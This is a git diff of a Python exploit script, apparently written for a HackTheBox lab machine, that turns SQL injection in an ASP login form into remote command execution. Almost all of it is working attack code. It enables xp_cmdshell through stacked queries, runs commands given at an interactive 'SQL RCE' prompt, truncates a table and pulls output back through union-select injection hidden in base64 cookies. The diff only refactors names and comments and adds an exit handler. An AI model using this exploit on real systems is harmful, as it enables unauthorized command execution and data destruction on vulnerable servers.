@@ -4,15 +4,27 @@
 import requests
 from base64 import b64decode
 from urllib.parse import unquote
-import time
+
+def logo():
+    display = "░██████╗░██████╗░██╗░░░░░\n"
+    display += "██╔════╝██╔═══██╗██║░░░░░\n"
+    display += "╚█████╗░██║██╗██║██║░░░░░\n"
+    display += "░╚═══██╗╚██████╔╝██║░░░░░\n"
+    display += "██████╔╝░╚═██╔═╝░███████╗\n"
+    display += "╚═════╝░░░░╚═╝░░░╚══════╝\n"
+    print(display)
+
+
+def decodeCookies(cookies):
+    return b64decode(unquote(cookies['Email']))
 
 def getOutput():
-    getIndex = "1 union select 1,2,3,4,(select top 1 ID from test order by ID desc),6-- -" #This helps get the max number of lines from the table
-    r = makeRequest(getIndex)
-    count = int(decodeCookies(r.cookies)) #Extracing the number from b64decoding the email
+    get_each_column_line = "1 union select 1,2,3,4,(select top 1 ID from test order by ID desc),6-- -"
+    column_line_request = makeRequest(get_each_column_line)
+    count = int(decodeCookies(column_line_request.cookies))
 
-    for i in range(1,count):
-        line = makeRequest(f'1 union select 1,2,3,4,(select output from test where ID = {i}),6-- -')
+    for each_column_row in range(1,count):
+        line = makeRequest(f'1 union select 1,2,3,4,(select output from test where ID = {each_column_row}),6-- -')
         try:
             output = decodeCookies(line.cookies)
             print(output.decode())
@@ -20,46 +32,39 @@ def getOutput():
             None
 
 
-def makeRequest(action):
-    URL = "http://members.streetfighterclub.htb/old/verify.asp"
-    return requests.post(URL, allow_redirects=False, data={'username':'admin','password':'admin','logintype':action,'rememberme':'ON','B1':'LogIn'})
+def makeRequest(sql_command):
+    target_url = "http://members.streetfighterclub.htb/old/verify.asp"
+    return requests.post(target_url, allow_redirects=False, data={'username':'admin','password':'admin','logintype':sql_command,'rememberme':'ON','B1':'LogIn'})
 
 def runCMD(Input):
-    truncatingTable = "1;TRUNCATE TABLE test;" #Removes records from the table
+    truncatingTable = "1;TRUNCATE TABLE test;"
     makeRequest(truncatingTable)
-    Input = Input.replace("'","''") #replaces the single quotes to double quotues below for Input
+    Input = Input.replace("'","''")
     makeRequest(f"1;insert into test (output) exec Xp_CmDShelL '{Input}';-- -")
     getOutput()
 
-def decodeCookies(cookies): #b64 decode the email
-    return b64decode(unquote(cookies['Email']))
-
 def Setup(Input):
 
-    TurnOnXPShell = "1;EXEC sp_configure 'show advanced options', 1; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -" #For good measure
+    TurnOnXPShell = "1;EXEC sp_configure 'show advanced options', 1; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -"
         
-    NewTable = "3;CREATE TABLE test (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))" 
+    Create_New_Table = "3;CREATE TABLE test (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))" 
 
     makeRequest(TurnOnXPShell) 
 
-    makeRequest(NewTable)
+    makeRequest(Create_New_Table)
    
     runCMD(Input)
 
 def main():
-    
-    print("░██████╗░██████╗░██╗░░░░░")
-    print("██╔════╝██╔═══██╗██║░░░░░")
-    print("╚█████╗░██║██╗██║██║░░░░░")
-    print("░╚═══██╗╚██████╔╝██║░░░░░")
-    print("██████╔╝░╚═██╔═╝░███████╗")
-    print("╚═════╝░░░░╚═╝░░░╚══════╝")
-    print("\n")
-    time.sleep(1)
+    logo()
 
-    while True: #Endless loop so RCE doesn't end
-        Input = input("SQL RCE: ")
-        Setup(Input)
+    while True:
+        try:
+            Input = input("SQL RCE: ")
+            Setup(Input)
+        except KeyboardInterrupt:
+            print("Bye Bye!")
+            exit()
 
 if __name__ == "__main__":
     main()
